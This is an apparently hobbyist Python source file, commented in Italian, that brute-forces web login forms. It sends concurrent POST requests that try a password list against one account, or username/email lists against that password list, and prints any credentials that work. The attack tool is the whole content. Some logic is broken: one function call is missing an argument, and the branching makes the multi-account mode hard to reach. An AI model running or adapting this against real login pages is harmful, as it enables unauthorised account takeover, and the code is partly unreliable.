import asyncio
import httpx
import aiofiles
from .Options import headers,get_body  # Presumendo che 'Options' contenga intestazioni necessarie

import os

async def try_login(client, url, data):
    """Effettua una richiesta di login e restituisce la risposta."""
    return await client.post(url, headers=headers, data=data)

async def load_file(filename):
    """Carica le righe di un file e restituisce una lista di stringhe."""
    try:
        async with aiofiles.open(filename, "r", encoding="latin-1") as file:
            lista = [line.strip() for line in await file.readlines()]
            return lista  # Restituisci la lista di password
    except FileNotFoundError:
        print(f"Errore: il file {filename} non esiste.")
        return []

async def attempt_login(client, url, data):
    """Tenta di effettuare il login con un identificatore e una password."""
    response = await try_login(client, url, data)
    # Gestisci i vari status code che indicano un login riuscito
    if response.status_code in [200, 201, 204, 302]:
        return True
    else:
        return False

async def login_with_provided_credentials(client, url, identifier,data, password, is_email):
    """Effettua il login con le credenziali fornite dall'utente."""
    success = await attempt_login(client, url,data)
    if success:
        print(f"Login riuscito con {'email' if is_email else 'username'}: {identifier} e password: {password}")
    return success

async def login_with_file_credentials(client, url, identifier, passwords, is_email, semaphore):
    """Effettua login con tutte le password da un file."""
    async with semaphore:  # Limita l'accesso a 10 task
        for password in passwords:
            data = {'password': password}
            if is_email:
                data['email'] = identifier
            else:
                data['username'] = identifier

            success = await attempt_login(client, url, data)
            if success:
                print(f"Login riuscito con {'email' if is_email else 'username'}: {identifier} e password: {password}")
                return True
    return False

async def startCredBruteForce():
    filename = "./BruteForceWebLogin/usernames.txt"
    if not os.path.isfile(filename):
        print(f"Il file {filename} non esiste nella directory corrente.")
        return

    """Funzione principale per gestire il login."""
    url = input("Inserisci l'URL/API di login: ")
    # Chiedi se usare il corpo di default
    use_default_body = input("Do you want to use the default body structure? (y/n): ").lower() == 'y'
    login_type = input("Vuoi effettuare il login con (1) Email o (2) Username? ")

    is_email = login_type == '1'
    identifier = input(f"Inserisci il {'tuo indirizzo email' if is_email else 'tuo username'}: ")
    has_password = input("Hai una password? (y/n): ").lower() == 'y'

    

    # Data structure for the request
    if use_default_body:
        # Usa il metodo get_body per ottenere il corpo predefinito
        data = get_body()

        # Aggiorna il corpo con l'identificatore e la password
        if is_email:
            data["email"] = identifier
        else:
            data["username"] = identifier

        if has_password:
            data["password"] = input("Inserisci la tua password: ")
        else:
            passwords = await load_file("./BruteForceWebLogin/passwords.txt")
            if not passwords:
                print("Il file delle password è vuoto.")
                return
    else:
        # Permetti all'utente di inserire manualmente la struttura del corpo
        body_struct = input("Enter the body structure (e.g., user=username&pass=password&restofvariables=value): ")
        
        # Parsing della struttura di input
        data = {}
        for pair in body_struct.split('&'):
            key, value = pair.split('=')
            data[key] = value
    
    # Chiedi il numero di thread
    while True:
        thread_input = input("Enter the number of threads (press Enter for default: 3): ")
        
        # Usa il valore predefinito se l'input è vuoto
        if thread_input.strip() == "":
            thread_number = 3
            break
        
        # Tenta di convertire l'input in un intero
        try:
            thread_number = int(thread_input)
            if thread_number <= 0:  # Assicurati che il numero sia positivo
                print("Please enter a positive integer. Using default value 3.")
                thread_number = 3
                break
            break  # Esci dal ciclo se l'input è valido
        except ValueError:
            print("Invalid input. Please enter a valid integer.")

    
    # Esegui la richiesta con le credenziali inserite
    async with httpx.AsyncClient() as client:

        #caso in cui l'utente inserisce mail/user e password
        if identifier and has_password:
            await login_with_provided_credentials(client, url, identifier, data["password"], is_email)

        #caso in cui l'utente inserisce solo mail/user (bruteforce password only)
        elif has_password ==  False:
            passwords = await load_file("./BruteForceWebLogin/passwords.txt")
            
            if not passwords:
                print("Il file delle password è vuoto.")
                return
            semaphore = asyncio.Semaphore(thread_number)  # Massimo 10 task simultanei
            tasks = []
            tasks.append(login_with_file_credentials(client, url, identifier, passwords, is_email, semaphore))
            results = await asyncio.gather(*tasks)
            if any(results):
                print("Almeno un login è andato a buon fine.")
        #caso in cui l'utente non conosce nè mail/user nè password (pitchfork attack)
        else:
            passwords = await load_file("./BruteForceWebLogin/passwords.txt")
            if not passwords:
                print("Il file delle password è vuoto.")
                return
            
            semaphore = asyncio.Semaphore(thread_number)  # Massimo 10 task simultanei
            tasks = []
            #carico le mail
            if is_email:
                emails = await load_file("./BruteForceWebLogin/mail.txt")
                for email in emails:
                    tasks.append(login_with_file_credentials(client, url, email, passwords, is_email, semaphore))
            #carico gli user
            else:
                usernames = await load_file("./BruteForceWebLogin/usernames.txt")
                for username in usernames:
                    tasks.append(login_with_file_credentials(client, url, username, passwords, is_email, semaphore))

            # Attendi che tutte le attività siano completate
            results = await asyncio.gather(*tasks)
            if any(results):
                print("Almeno un login è andato a buon fine.")
